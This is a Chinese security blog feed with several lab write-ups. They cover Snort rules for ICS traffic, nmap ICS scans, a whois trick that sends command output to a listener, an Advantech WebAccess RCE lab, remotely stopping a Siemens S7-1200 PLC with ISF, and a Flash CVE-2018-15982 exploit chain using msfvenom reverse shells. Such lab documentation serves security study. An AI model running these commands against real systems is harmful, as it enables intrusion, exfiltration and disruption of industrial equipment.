<figure data-type="image" tabindex="1"><img src="https://hi-kk.github.io//post-images/1563935501116.png" alt=""></figure>
<pre><code># path to dynamic preprocessor libraries

dynamicpreprocessor directory c:\snort\lib\snort_dynamicpreprocessor

# path to base preprocessor engine

dynamicengine c:\snort\lib\snort_dynamicengine\sf_engine.dll
</code></pre>
<figure data-type="image" tabindex="2"><img src="https://hi-kk.github.io//post-images/1563935513767.png" alt=""></figure>
<figure data-type="image" tabindex="3"><img src="https://hi-kk.github.io//post-images/1563935527636.png" alt=""></figure>
<p>此处安装参考:http://www.cnblogs.com/lasgalen/p/4512755.html</p>
<h2 id="规则验证">规则验证</h2>
<p>进入<code>C:\Snort\rules</code>，新建三个文件</p>
<figure data-type="image" tabindex="4"><img src="https://hi-kk.github.io//post-images/1563935541107.png" alt=""></figure>
<p>在文件<code>local.rules</code>添加我们的snort规则进行验证测试，例如：</p>
<pre><code>alert tcp any any -&gt; any 1911 (msg:&quot;IDS: fox-info&quot;; content:&quot;|66 6f 78|&quot;;  sid:1112515; rev:1;)
</code></pre>
<p>CMD进入目录<code>C:\Snort\bin</code></p>
<p>注意：snort只能识别pcap后缀的包文件，用wireshark的pcapng后缀会报错 需要再另存为一下 修改文件格式 不是直接改后缀哦</p>
<figure data-type="image" tabindex="5"><img src="https://hi-kk.github.io//post-images/1563935566053.png" alt=""></figure>
<p><img src="https://hi-kk.github.io//post-images/1563935577435.png" alt=""><br>
然后运行：</p>
<pre><code>PS C:\Snort\bin&gt; .\snort.exe  -c c:\snort\etc\snort.conf -l c:\snort\log -r .\fox_info.pcap
</code></pre>
<p>没有报错就说明成功运行了，去看看log有没有输出信息</p>
<p>进入<code>C:\Snort\log</code></p>
<figure data-type="image" tabindex="6"><img src="https://hi-kk.github.io//post-images/1563935592124.png" alt=""></figure>
<p><img src="https://hi-kk.github.io//post-images/1563935604411.png" alt=""><br>
成功按规则进行了信息输出，到此规则验证成功</p>
<h2 id="pcap规则编写思路">pcap规则编写思路</h2>
<p>IEC61850-MMS协议</p>
<figure data-type="image" tabindex="7"><img src="https://hi-kk.github.io//post-images/1563935624772.png" alt=""></figure>
<p>先用wireshark打开对应的数据包文件，因为wireshark适配了mms协议的解析，所以可以很直观的分辨出哪个数据包对应什么功能</p>
<figure data-type="image" tabindex="8"><img src="https://hi-kk.github.io//post-images/1563935642261.png" alt=""></figure>
<p>从上图可知，选中的数据包执行的是<strong>start</strong>操作</p>
<figure data-type="image" tabindex="9"><img src="https://hi-kk.github.io//post-images/1563935658744.png" alt=""></figure>
<p>从上图可知，选中的数据包执行的是<strong>stop</strong>操作</p>
<p>现在，我们把对应的数据包十六进制数据提取出来，做一下对比，就可以很轻松的写出对应的snort规则</p>
<figure data-type="image" tabindex="10"><img src="https://hi-kk.github.io//post-images/1563935678185.png" alt=""></figure>
<p>提取出snort规则，在文件<code>local.rules</code>添加我们的snort规则进行验证测试，例如：</p>
<pre><code>alert tcp any any -&gt; any 102 (msg:&quot;IDS: mms-START&quot;; content:&quot;|bf 28 1b|&quot;;  sid:1112727; rev:1;)
alert tcp any any -&gt; any 102 (msg:&quot;IDS: mms-STOP&quot;; content:&quot;|bf 29 19|&quot;;  sid:1112728; rev:1;)
alert tcp any any -&gt; any 102 (msg:&quot;IDS: mms-RESET&quot;; content:&quot;|bf 2b 19|&quot;;  sid:1112729; rev:1;)
</code></pre>
<p>尝试验证一下数据包的规则，查看日志：</p>
<figure data-type="image" tabindex="11"><img src="https://hi-kk.github.io//post-images/1563935695810.png" alt=""></figure>
<p>可以发现日志里记录了规则命中的输出信息，到此就算规则编写完成了。</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[工控安全：工控常见协议识别]]></title>
        <id>https://hi-kk.github.io//post/gong-kong-an-quan-gong-kong-chang-jian-xie-yi-shi-bie</id>
        <link href="https://hi-kk.github.io//post/gong-kong-an-quan-gong-kong-chang-jian-xie-yi-shi-bie">
        </link>
        <updated>2019-03-13T03:23:08.000Z</updated>
        <summary type="html"><![CDATA[<h2 id="前言">前言</h2>
<p>首先是因为接到一个任务：需要对工控常见协议的识别流量进行收集。<br>
项目见：https://github.com/hi-KK/ICS-Protocol-identify （含nse脚本和识别pcap流量）</p>
]]></summary>
        <content type="html"><![CDATA[<h2 id="前言">前言</h2>
<p>首先是因为接到一个任务：需要对工控常见协议的识别流量进行收集。<br>
项目见：https://github.com/hi-KK/ICS-Protocol-identify （含nse脚本和识别pcap流量）</p>
<!-- more -->
<figure data-type="image" tabindex="1"><img src="https://hi-kk.github.io//post-images/1563936445292.png" alt=""></figure>
<h2 id="工控常见协议">工控常见协议</h2>
<table>
<thead>
<tr>
<th>协议</th>
<th>通信</th>
<th>端口</th>
</tr>
</thead>
<tbody>
<tr>
<td>Siemens S7</td>
<td>tcp</td>
<td>102</td>
</tr>
<tr>
<td>Modbus</td>
<td>tcp</td>
<td>502</td>
</tr>
<tr>
<td>IEC 60870-5-104</td>
<td>tcp</td>
<td>2404</td>
</tr>
<tr>
<td>DNP3</td>
<td>tcp</td>
<td>20000</td>
</tr>
<tr>
<td>EtherNet/IP</td>
<td>udp</td>
<td>44818</td>
</tr>
<tr>
<td>BACnet</td>
<td>udp</td>
<td>47808</td>
</tr>
<tr>
<td>Tridium Niagara Fox</td>
<td>tcp</td>
<td>1911</td>
</tr>
<tr>
<td>Crimson V3</td>
<td>tcp</td>
<td>789</td>
</tr>
<tr>
<td>OMRON FINS</td>
<td>tcp</td>
<td>9600</td>
</tr>
<tr>
<td>PCWorx</td>
<td>tcp</td>
<td>1962</td>
</tr>
<tr>
<td>ProConOs</td>
<td>tcp</td>
<td>20547</td>
</tr>
<tr>
<td>MELSEC-Q</td>
<td>tcp</td>
<td>5007</td>
</tr>
</tbody>
</table>
<h2 id="工控协议识别">工控协议识别</h2>
<h3 id="siemens-s7">Siemens S7</h3>
<pre><code>nmap -sS -Pn -p 102 --script s7-info -iL 123.txt -oX 123.xml
</code></pre>
<h3 id="modbus">Modbus</h3>
<pre><code>nmap -sS -Pn -p 502 --script modicon-info -iL 123.txt -oX 123.xml
</code></pre>
<h3 id="iec-60870-5-104">IEC 60870-5-104</h3>
<pre><code>nmap -Pn -n -d --script iec-identify.nse  --script-args='iec-identify.timeout=500' -p 2404 &lt;host&gt;
</code></pre>
<h3 id="dnp3">DNP3</h3>
<pre><code>nmap --script dnp3-info -p 20000 &lt;host&gt;
</code></pre>
<h3 id="ethernetip">EtherNet/IP</h3>
<pre><code>nmap --script enip-info -sU  -p 44818 &lt;host&gt;
</code></pre>
<h3 id="bacnet">BACnet</h3>
<pre><code>nmap --script bacnet-info -sU -p 47808 &lt;host&gt;
</code></pre>
<h3 id="tridium-niagara-fox">Tridium Niagara Fox</h3>
<pre><code>nmap --script fox-info.nse -p 1911 &lt;host&gt;
</code></pre>
<h3 id="crimson-v3">Crimson V3</h3>
<pre><code>nmap --script cr3-fingerprint -p 789 &lt;host&gt;
</code></pre>
<h3 id="omron-fins">OMRON FINS</h3>
<pre><code>nmap --script omron-info -sU -p 9600 &lt;host&gt;
nmap --script ormontcp-info -p 9600 &lt;host&gt;
nmap --script ormonudp-info -sU -p 9600 &lt;host&gt;

</code></pre>
<h3 id="pcworx">PCWorx</h3>
<pre><code>nmap --script pcworx-info -p 1962 &lt;host&gt;

</code></pre>
<h3 id="proconos">ProConOs</h3>
<pre><code>nmap --script proconos-info -p 20547 &lt;host&gt;

</code></pre>
<h3 id="melsec-q">MELSEC-Q</h3>
<pre><code>nmap -script melsecq-discover -sT -p 5007 &lt;host&gt;
nmap -script melsecq-discover-udp.nse -sU -p 5006 &lt;host&gt;

</code></pre>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[分享自己的工控爬虫项目—PySpider-ICS]]></title>
        <id>https://hi-kk.github.io//post/fen-xiang-zi-ji-de-gong-kong-pa-chong-xiang-mu-pyspider-ics</id>
        <link href="https://hi-kk.github.io//post/fen-xiang-zi-ji-de-gong-kong-pa-chong-xiang-mu-pyspider-ics">
        </link>
        <updated>2019-03-08T01:05:13.000Z</updated>
        <summary type="html"><![CDATA[<p>此项目用来记录使用pyspider爬虫框架爬取工控相关数据(漏洞、预警、安全事件等)</p>
]]></summary>
        <content type="html"><![CDATA[<p>此项目用来记录使用pyspider爬虫框架爬取工控相关数据(漏洞、预警、安全事件等)</p>
<!--more-->
<p><a href="https://github.com/hi-KK/PySpider-ICS">https://github.com/hi-KK/PySpider-ICS</a><br>
<img src="https://hi-kk.github.io//post-images/1563937548686.png" alt=""></p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[渗透技巧：巧用whois外带回显命令执行结果]]></title>
        <id>https://hi-kk.github.io//post/shen-tou-ji-qiao-qiao-yong-whois-wai-dai-hui-xian-ming-ling-zhi-xing-jie-guo</id>
        <link href="https://hi-kk.github.io//post/shen-tou-ji-qiao-qiao-yong-whois-wai-dai-hui-xian-ming-ling-zhi-xing-jie-guo">
        </link>
        <updated>2019-03-05T07:10:02.000Z</updated>
        <summary type="html"><![CDATA[<p>在实战过程中，可能会遇到一些复杂的网络情况，导致需要执行的命令没办法看到返回结果，这就给后续渗透带来很大的不便，从twitter中看到一种新型的命令执行结果外带的方法，在这里分享记录一下。</p>
]]></summary>
        <content type="html"><![CDATA[<p>在实战过程中，可能会遇到一些复杂的网络情况，导致需要执行的命令没办法看到返回结果，这就给后续渗透带来很大的不便，从twitter中看到一种新型的命令执行结果外带的方法，在这里分享记录一下。</p>
<!--more-->
<p>先看一下<code>whois</code>命令的使用介绍</p>
<pre><code class="language-bash">root@kali:~# whois -h
whois: 选项需要一个参数 -- h
用法： whois 【选项】 …… 对象 …… 

-h HOST, --host HOST    连接到服务器 HOST
-p PORT, --port PORT    连接到端口 PORT
-H                      隐藏法律声明 
      --verbose         解释正在做什么 
      --help            显示帮助并退出 
      --version         输出版本信息并退出 

这些标志是由 whois.ript.net 和 RIPE-like 服务器支持的： 
 -l                     寻找有更少具体匹配的一个级别 
-L                     寻找所有更少具体匹配的级别 
-m                   寻找有更加具体匹配的一个级别 
-M                   寻找有更加具体的匹配的所有级别 
-c                     寻找包含 mnt-irt 属性的最小匹配 
-x                     精确匹配 
-b                     return brief IP address ranges with abuse contact
-B                     关闭对象过滤（显示 email 地址） 
-G                    关闭相关联对象的分组 
-d                     返回 DNS 反解授权对象 
-i ATTR[,ATTR]...      对特定的属性（ ATTR ）进行逆向查询 
-T TYPE[,TYPE]...      只寻找 TYPE 的对象 
-K                      只返回主键 
-r                      关闭联系信息的递归查询 
-R                     强制显示域对象的本地副本，即使 
                         它包含引用 
-a                     一并搜索所有的数据库镜像 
-s SOURCE[,SOURCE]...   从 SOURCE 中搜索数据库镜像 
-g SOURCE:FIRST-LAST   从串行的 FIRST 到 LAST 的 SOURCE 中查找更新 
-t TYPE                 请求 TYPE 对象的模板 
-v TYPE                 请求 TYPE 对象的详细模板 
-q [version|sources|types]   询问制定服务器信息 
root@kali:~#
</code></pre>
<p>仔细点就可以发现<code>whois</code>命令有两个参数可以连接到远程服务器<code>-h</code>和<code>-p</code><br>
那么我们来尝试下利用<code>whois</code>命令外带回显命令执行结果<br>
先在kali中监听一个端口用来接收回显结果</p>
<figure data-type="image" tabindex="1"><img src="https://hi-kk.github.io//post-images/1563937879120.png" alt=""></figure>
<p>在ubuntu中执行命令</p>
<pre><code class="language-bash">whois -h 192.168.159.132 -p 555 &quot;`whoami&amp;uname -a`&quot;
</code></pre>
<p><em>需要注意：这里使用的是反引号，这样才会在linux的bash环境执行命令，后面的双引号可带可不带</em></p>
<p>执行后就看到命令的回显结果已经带出到kali中了<br>
<img src="https://hi-kk.github.io//post-images/1563937905345.png" alt=""></p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[漏洞实验：Advantech WebAccess远程命令执行]]></title>
        <id>https://hi-kk.github.io//post/lou-dong-shi-yan-cve-2017-16720-advantech-webaccess-yuan-cheng-ming-ling-zhi-xing-lou-dong</id>
        <link href="https://hi-kk.github.io//post/lou-dong-shi-yan-cve-2017-16720-advantech-webaccess-yuan-cheng-ming-ling-zhi-xing-lou-dong">
        </link>
        <updated>2019-01-08T05:50:11.000Z</updated>
        <summary type="html"><![CDATA[<h2 id="漏洞编号">漏洞编号</h2>
<p>CVE-2017-16720</p>
]]></summary>
        <content type="html"><![CDATA[<h2 id="漏洞编号">漏洞编号</h2>
<p>CVE-2017-16720</p>
<!--more-->
<p>此漏洞允许攻击者使用RPC协议通过TCP端口4592执行远程命令。<br>
通过利用恶意分布式计算环境/远程过程调用（DCERPC），webvrpcs.exe服务将命令行指令传递给主机， webvrpcs.exe服务以管理员访问权限运行。版本小于8.3、8.3.1、8.3.2仍然存在特定的安全漏洞。</p>
<h2 id="漏洞说明">漏洞说明</h2>
<blockquote>
<p>研华WebAccess软件是研华物联网应用平台解决方案的核心，为用户提供一个基于HTML5技术用户界面，实现跨平台、跨浏览器的数据访问体验。使用WebAccess后，用户可以建立一个信息管理平台，同步提高垂直市场管理发展的效率。</p>
</blockquote>
<blockquote>
<p>研华WebAccess提供了一个基于HTML5的智能仪表板作为下一代WebAccess的人机界面。其中，小部件功能可以让系统集成商通过分析图表和图形用仪表板编辑器来创建自定义信息页面。在创建仪表板界面之后，最终用户可以通过仪表板查看器来查看数据与以及可以在电脑，Mac，平板电脑和智能手机通过任何浏览器无缝观看体验。</p>
</blockquote>
<p>此漏洞允许攻击者使用RPC协议通过TCP端口4592执行远程命令。<br>
通过利用恶意分布式计算环境/远程过程调用（DCERPC），webvrpcs.exe服务将命令行指令传递给主机， webvrpcs.exe服务以管理员访问权限运行。版本小于8.3、8.3.1、8.3.2仍然存在特定的安全漏洞。</p>
<h2 id="漏洞复现">漏洞复现</h2>
<p>通过官方渠道，下载存在该漏洞的版本程序<br>
<a href="">http://advcloudfiles.advantech.com/web/Download/webaccess/8.2/AdvantechWebAccessUSANode8.2_20170817.exe</a></p>
<p><strong>安装环境：Windows Server 2008 R2 x64</strong><br>
<img src="https://hi-kk.github.io//post-images/1563938270052.png" alt=""></p>
<p>安装一律默认NEXT即可，TCP端口也无需自定义，默认程序端口4592<br>
<img src="https://hi-kk.github.io//post-images/1563938286276.png" alt=""></p>
<p>安装完成，系统重启，可查看本机开放端口情况<br>
<img src="https://hi-kk.github.io//post-images/1563938302550.png" alt=""></p>
<p>可以看到漏洞所利用的端口4592已经正常开放<br>
现在，我们使用附件中的EXP脚本，对搭载Advantech WebAccess 8.2-2017.08.18程序的服务器进行攻击<br>
<img src="https://hi-kk.github.io//post-images/1563938320827.png" alt=""></p>
<p>漏洞攻击成功的话，利用EXP脚本发送系统命令执行指令到服务器上，服务器会执行对应指令，弹出计算器。<br>
<img src="https://hi-kk.github.io//post-images/1563938333843.png" alt=""><br>
<img src="https://hi-kk.github.io//post-images/1563938347128.png" alt=""></p>
<p>可以看到服务器弹出了计算器，证明漏洞利用成功!</p>
<h2 id="流量分析">流量分析</h2>
<p>通过对EXP脚本执行过程中，使用Wireshark抓取对应数据流量，来看服务器通信过程<br>
<img src="https://hi-kk.github.io//post-images/1563938361402.png" alt=""><br>
<img src="https://hi-kk.github.io//post-images/1563938373889.png" alt=""></p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[工控安全：S7-1200 PLC远程启停攻击实验]]></title>
        <id>https://hi-kk.github.io//post/gong-kong-an-quan-s7-1200-plc-yuan-cheng-qi-ting-gong-ji-shi-yan</id>
        <link href="https://hi-kk.github.io//post/gong-kong-an-quan-s7-1200-plc-yuan-cheng-qi-ting-gong-ji-shi-yan">
        </link>
        <updated>2018-12-29T02:20:08.000Z</updated>
        <summary type="html"><![CDATA[<p>公司刚好有此PLC设备，于是利用github上的开源脚本对S7-1200 PLC进行远程启停攻击实验</p>
]]></summary>
        <content type="html"><![CDATA[<p>公司刚好有此PLC设备，于是利用github上的开源脚本对S7-1200 PLC进行远程启停攻击实验</p>
<!--more-->
<h2 id="工具及运行环境">工具及运行环境</h2>
<pre><code class="language-bash">root@kali:~# git clone https://github.com/dark-lbp/isf/
root@kali:~# cd isf/
root@kali:~/isf# python isf.py 
root@kali:~/isf# pip install -r requirements.txt
</code></pre>
<p>安装好所需python模块，运行isf.py无报错<br>
<img src="https://hi-kk.github.io//post-images/1563938824684.png" alt=""></p>
<h2 id="网络设置与plc连接">网络设置与PLC连接</h2>
<p>本次实验所用的PLC设备如下，设备型号为<code>SIMATIC S7-1200</code><br>
<img src="https://hi-kk.github.io//post-images/1563938844104.png" alt=""></p>
<p>将设备接通电源后，此时PLC 指示灯<code>RUN/STOP</code>点亮 绿灯<br>
<img src="https://hi-kk.github.io//post-images/1563938863112.png" alt=""></p>
<p>此时使用网线将PLC与主机相连，配置主机网卡IP地址<br>
<img src="https://hi-kk.github.io//post-images/1563938884154.png" alt=""></p>
<p>此时我们还不知道PLC设定的IP地址，所以需要对网段进行扫描<br>
<img src="https://hi-kk.github.io//post-images/1563938898774.png" alt=""></p>
<p>可以看到：使用nmap扫描出的设备除了本机IP就是<code>PLC</code>设备的IP了，其对应的MAC地址也与设备上的标识一致</p>
<h2 id="远程攻击演示">远程攻击演示</h2>
<p>这里我们用的到的攻击模块是<br>
<code>exploits/plcs/siemens/s7_1200_plc_control</code><br>
<img src="https://hi-kk.github.io//post-images/1563938919118.png" alt=""></p>
<p><code>show options查看该模块的配置信息</code><br>
<code>target: 攻击PLC目标IP地址</code><br>
<code>port: 攻击PLC目标端口（默认是102端口）</code><br>
<code>command：攻击指令（0-启动PLC、1-停止PLC、2-重置PLC、3-重置PLC和IP）</code><br>
<img src="https://hi-kk.github.io//post-images/1563938934709.png" alt=""></p>
<p>设置好后，输入run指令 开始远程攻击<code>PLC</code><br>
<img src="https://hi-kk.github.io//post-images/1563938954082.png" alt=""></p>
<p>此时<code>PLC</code>指示灯 <code>RUN/STOP</code> 变成 黄灯，说明PLC设备已经停止运行，远程攻击成功！</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[漏洞实验：Adobe Flash Player远程代码执行]]></title>
        <id>https://hi-kk.github.io//post/lou-dong-shi-yan-cve-2018-15982-adobe-flash-player-yuan-cheng-dai-ma-zhi-xing</id>
        <link href="https://hi-kk.github.io//post/lou-dong-shi-yan-cve-2018-15982-adobe-flash-player-yuan-cheng-dai-ma-zhi-xing">
        </link>
        <updated>2018-12-26T01:11:13.000Z</updated>
        <summary type="html"><![CDATA[<p>漏洞编号：CVE-2018-15982</p>
]]></summary>
        <content type="html"><![CDATA[<p>漏洞编号：CVE-2018-15982</p>
<!-- more -->
<h2 id="漏洞简介">漏洞简介</h2>
<table>
<thead>
<tr>
<th><strong>漏洞名称</strong></th>
<th>Adobe Flash Player远程代码执行漏洞</th>
</tr>
</thead>
<tbody>
<tr>
<td><strong>威胁类型</strong></td>
<td>远程代码执行</td>
</tr>
<tr>
<td><strong>威胁等级</strong></td>
<td>高</td>
</tr>
<tr>
<td><strong>漏洞ID</strong></td>
<td>CVE-2018-15982</td>
</tr>
<tr>
<td><strong>利用场景</strong></td>
<td>攻击者通过网页下载、电子邮件、即时通讯等渠道向受害者发送恶意构造的Office文件诱使其打开处理，可能触发漏洞在用户系统上执行任意指令获取控制。</td>
</tr>
<tr>
<td><strong>受影响系统及应用版本</strong></td>
<td>Adobe Flash Player（31.0.0.153及更早的版本）</td>
</tr>
<tr>
<td><strong>不受影响影响系统及应用版本</strong></td>
<td>Adobe Flash Player 32.0.0.101（修复后的最新版本）</td>
</tr>
<tr>
<td><strong>修复及升级地址</strong></td>
<td>https://get.adobe.com/flashplayer/</td>
</tr>
</tbody>
</table>
<h2 id="生成msf后门">生成msf后门</h2>
<pre><code class="language-bash">root@kali:~# msfvenom -p windows/meterpreter/reverse_tcp LPORT=5555 LHOST=192.168.177.148 -f raw &gt;86.bin
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 341 bytes

root@kali:~# msfvenom -p windows/meterpreter/reverse_tcp LPORT=5555 LHOST=192.168.177.148 -f raw &gt;64.bin
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 341 bytes
</code></pre>
<figure data-type="image" tabindex="1"><img src="https://hi-kk.github.io//post-images/1563970336343.png" alt=""></figure>
<h2 id="生成exploit">生成exploit</h2>
<p>将msf生成的两个文件86.bin和64.bin放入脚本所在目录下，执行脚本，生成exploit</p>
<pre><code class="language-bash">root@kali:~/CVE-2018-15982_EXP-master# python CVE_2018_15982.py  -i 86.bin -I 64.bin

[*] Done ! output file --&gt; exploit.swf
[*] Done ! output file --&gt; index.html
root@kali:~/CVE-2018-15982_EXP-master#
</code></pre>
<figure data-type="image" tabindex="2"><img src="https://hi-kk.github.io//post-images/1563970354206.png" alt=""></figure>
<h2 id="开启本地http服务">开启本地HTTP服务</h2>
<p>利用python自带服务，在脚本当前目录开启HTTP服务</p>
<pre><code class="language-bash">root@kali:~/CVE-2018-15982_EXP-master# python -m SimpleHTTPServer 8080
</code></pre>
<figure data-type="image" tabindex="3"><img src="https://hi-kk.github.io//post-images/1563970377161.png" alt=""></figure>
<h2 id="开启msf反弹监听">开启MSF反弹监听</h2>
<pre><code class="language-bash">msf &gt; use exploit/multi/handler 
msf exploit(multi/handler) &gt; set payload windows/meterpreter/reverse_tcp
payload =&gt; windows/meterpreter/reverse_tcp
msf exploit(multi/handler) &gt; set LPORT 5555
LPORT =&gt; 5555
msf exploit(multi/handler) &gt; set LHOST 192.168.177.148
LHOST =&gt; 192.168.177.148
msf exploit(multi/handler) &gt; run
</code></pre>
<figure data-type="image" tabindex="4"><img src="https://hi-kk.github.io//post-images/1563970388609.png" alt=""></figure>
<h2 id="反弹shell">反弹shell</h2>
<p>模拟受害者访问HTTP服务，触发漏洞，反弹shell<br>
<img src="https://hi-kk.github.io//post-images/1563970402748.png" alt=""><br>
也许访问后IE会崩溃，未响应<br>
<img src="https://hi-kk.github.io//post-images/1563970415353.png" alt=""><br>
但此时已经成功利用漏洞，反弹shell到msf上了<br>
<img src="https://hi-kk.github.io//post-images/1563970426386.png" alt=""><br>
注意：当浏览器访问的标签页关闭了，反弹的shell也会断开连接<br>
<img src="https://hi-kk.github.io//post-images/1563970440508.png" alt=""></p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[工控安全：如何将Shodan数据完美地存入数据库]]></title>
        <id>https://hi-kk.github.io//post/gong-kong-an-quan-ru-he-jiang-shodan-shu-ju-wan-mei-di-cun-ru-shu-ju-ku</id>
        <link href="https://hi-kk.github.io//post/gong-kong-an-quan-ru-he-jiang-shodan-shu-ju-wan-mei-di-cun-ru-shu-ju-ku">
        </link>
        <updated>2018-12-19T06:33:45.000Z</updated>
        <summary type="html"><![CDATA[<h2 id="开局">开局</h2>
<p><em>“ 开局一张图，内容全靠编 ”</em></p>
]]></summary>
        <content type="html"><![CDATA[<h2 id="开局">开局</h2>
<p><em>“ 开局一张图，内容全靠编 ”</em></p>
<!--more-->
<hr>
<p>先从需求说起：现在需要将shodan上关于工控相关协议和产品设备的指纹数据下载下来，录入本地的数据库<br>
好在shodan提供了data下载的功能，不过下载一次消耗<strong>1 export credit = 10,000 results</strong>,而这个<strong>credit</strong>是需要购买的。<br>
<img src="https://hi-kk.github.io//post-images/1564126484518.png" alt=""><br>
通过一些途径，我们的账户现在有了一些<strong>credit</strong>可供下载数据，而shodan也提供三种下载数据的文件格式（json、csv、xml）<br>
<img src="https://hi-kk.github.io//post-images/1564126500170.png" alt=""><br>
按说，这三种格式的文件是可以直接通过Navicat导入到数据库的<br>
<img src="https://hi-kk.github.io//post-images/1564126514623.png" alt=""></p>
<h2 id="困境">困境</h2>
<p>但是，我们从shodan上下载的文件准备直接导入数据库时候发生了一些问题：</p>
<ol>
<li>shodan下载出的csv文件所存储的信息有效，缺少服务、产品型号、经纬度等<br>
<img src="https://hi-kk.github.io//post-images/1564126563239.png" alt=""></li>
<li>直接用下载出的json文件去导入数据库，发现只能导入字段名，而没有值<br>
<img src="https://hi-kk.github.io//post-images/1564126578261.png" alt=""></li>
</ol>
<p>为了解决这个困惑，查阅相关资料，我们了解到shodan有python版的库，其中包含了格式化的命令功能</p>
<blockquote>
<p>pip install shodan<br>
shodan<br>
<img src="https://hi-kk.github.io//post-images/1564126595734.png" alt=""><br>
<img src="https://hi-kk.github.io//post-images/1564126622839.png" alt=""></p>
</blockquote>
<p>可以通过以下命令来对json文件进行格式化操作，输出包含特定值的csv格式文件<br>
<code>shodan parse --fields ip_str,hostnames,isp,org,timestamp --separator , xxx.json &gt;&gt; xx.csv</code></p>
<hr>
<p>然而，结果还没达到我们想要的结果，如下图是一个标准的shodan给的json数据格式<br>
<img src="https://hi-kk.github.io//post-images/1564126649439.png" alt=""><br>
我们执行<code>shodan parse</code>命令只能格式化出跟节点的数据，如<code>ip|isp|port|hostnames|timestamp</code>等，而对第二节点的数据却难以获取到，如<code>location</code>节点下的<code>city|region_code|area_code</code>等<br>
那如果我们直接取<code>location</code>节点下的所有数据呢？输出的结果如下图<br>
<img src="https://hi-kk.github.io//post-images/1564126661173.png" alt=""><br>
可以看到，虽然这样是把<code>location</code>节点下所有的数据都取出来了，但是却有一些冗余数据，不符合要求，还得需要二次处理这些数据才能入库</p>
<p>那还有其他可以直接取出格式化的数据、不需要二次处理、直接导入数据库的方法吗？</p>
<h2 id="柳暗花明">柳暗花明</h2>
<p>这里我们再次研究发现shodan还有个内置命令<br>
<code>shodan convert</code></p>
<blockquote>
<p>convert命令可以把Shodan生成的JSON报告转化成KML和CSV格式</p>
</blockquote>
<p><img src="https://hi-kk.github.io//post-images/1564126675423.png" alt=""><br>
输出的csv内容如下<br>
<img src="https://hi-kk.github.io//post-images/1564126686864.png" alt=""><br>
确实比上一次的数据要整洁的多了，但多了一些不需要的字段，得想想办法去除，要是能自定义输出的字段数据就好了<br>
于是，我们想到可以研究下shodan的python库源码，看看能不能修改点代码什么的</p>
<hr>
<p>找到shodan的python安装包，寻找跟<code>convert</code>有关的功能模块代码<br>
<code>shodan-1.10.4.tar\shodan-1.10.4\shodan\cli\converter</code><br>
<img src="https://hi-kk.github.io//post-images/1564126713217.png" alt=""><br>
看来我们要想修改的代码可能就是<code>csvc.py</code><br>
我们按原代码的格式修改需要提取的字段值<br>
<img src="https://hi-kk.github.io//post-images/1564126726790.png" alt=""><br>
保存之后，再重新安装<code>shodan</code><br>
此时输出的结果就已经达到我们想要的了<br>
<img src="https://hi-kk.github.io//post-images/1564126737995.png" alt=""><br>
现在，我们再用<code>Navicat</code>导入数据库就会非常顺利了<br>
<img src="https://hi-kk.github.io//post-images/1564126747530.png" alt=""><br>
<img src="https://hi-kk.github.io//post-images/1564126761350.png" alt=""><br>
<img src="https://hi-kk.github.io//post-images/1564126782507.png" alt=""><br>
<img src="https://hi-kk.github.io//post-images/1564126797994.png" alt=""></p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[Hello Gridea]]></title>
        <id>https://hi-kk.github.io//post/hello-gridea</id>
        <link href="https://hi-kk.github.io//post/hello-gridea">
        </link>
        <updated>2018-12-11T16:00:00.000Z</updated>
        <summary type="html"><![CDATA[<p>👏  欢迎使用 <strong>Gridea</strong> ！<br>
✍️  <strong>Gridea</strong> 一个静态博客写作客户端。你可以用它来记录你的生活、心情、知识、笔记、创意... ...</p>
]]></summary>
        <content type="html"><![CDATA[<p>👏  欢迎使用 <strong>Gridea</strong> ！<br>
✍️  <strong>Gridea</strong> 一个静态博客写作客户端。你可以用它来记录你的生活、心情、知识、笔记、创意... ...</p>
<!-- more -->
<p><a href="https://github.com/getgridea/gridea">Github</a><br>
<a href="http://hvenotes.fehey.com/">Gridea 主页</a><br>
<a href="http://fehey.com/">示例网站</a></p>
<h2 id="特性">特性👇</h2>
<p>📝  你可以使用最酷的 <strong>Markdown</strong> 语法，进行快速创作</p>
<p>🌉  你可以给文章配上精美的封面图和在文章任意位置插入图片</p>
<p>🏷️  你可以对文章进行标签分组</p>
<p>📋  你可以自定义菜单，甚至可以创建外部链接菜单</p>
<p>💻  你可以在 <strong>𝖶𝗂𝗇𝖽𝗈𝗐𝗌</strong> 或 <strong>𝖬𝖺𝖼𝖮𝖲</strong> 设备上使用此客户端</p>
<p>🌎  你可以使用 <strong>𝖦𝗂𝗍𝗁𝗎𝖻 𝖯𝖺𝗀𝖾𝗌</strong> 或 <strong>Coding Pages</strong> 向世界展示，未来将支持更多平台</p>
<p>💬  你可以进行简单的配置，接入 <a href="https://github.com/gitalk/gitalk">Gitalk</a> 或 <a href="https://github.com/SukkaW/DisqusJS">DisqusJS</a> 评论系统</p>
<p>🇬🇧  你可以使用<strong>中文简体</strong>或<strong>英语</strong></p>
<p>🌁  你可以任意使用应用内默认主题或任意第三方主题，强大的主题自定义能力</p>
<p>🖥  你可以自定义源文件夹，利用 OneDrive、百度网盘、iCloud、Dropbox 等进行多设备同步</p>
<p>🌱 当然 <strong>Gridea</strong> 还很年轻，有很多不足，但请相信，它会不停向前🏃</p>
<p>未来，它一定会成为你离不开的伙伴</p>
<p>尽情发挥你的才华吧！</p>
<p>😘 Enjoy~</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[工控安全：Nmap NSE扫描脚本列表]]></title>
        <id>https://hi-kk.github.io//post/gong-kong-an-quan-nmap-nse-sao-miao-jiao-ben-lie-biao</id>
        <link href="https://hi-kk.github.io//post/gong-kong-an-quan-nmap-nse-sao-miao-jiao-ben-lie-biao">
        </link>
        <updated>2018-11-20T01:11:33.000Z</updated>
        <summary type="html"><![CDATA[<p>这里的nse脚本列表是针对工控协议的</p>
